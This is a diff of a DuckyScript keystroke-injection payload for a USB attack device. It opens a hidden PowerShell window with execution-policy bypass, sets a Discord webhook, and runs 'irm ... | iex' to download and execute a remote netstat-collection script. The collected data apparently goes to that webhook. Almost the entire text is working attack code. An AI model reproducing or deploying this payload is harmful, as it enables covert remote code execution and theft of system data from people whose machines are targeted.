@@ -36,8 +36,10 @@ GUI r
 DELAY 250
 DELETE
 STRING powershell -w h -ep bypass $discord='
+
 STRING WEBHOOK
 
-REM Reply example.com with YOUR LINK. The Payload should be Windows-netstat.ps1
-STRING';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm example.com | iex
+REM REQUIRED - Reply example.com with YOUR LINK. The Payload should be Windows-netstat.ps1
+DEFINE PAYLOAD example.com
+STRING ';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm PAYLOAD | iex
 ENTER
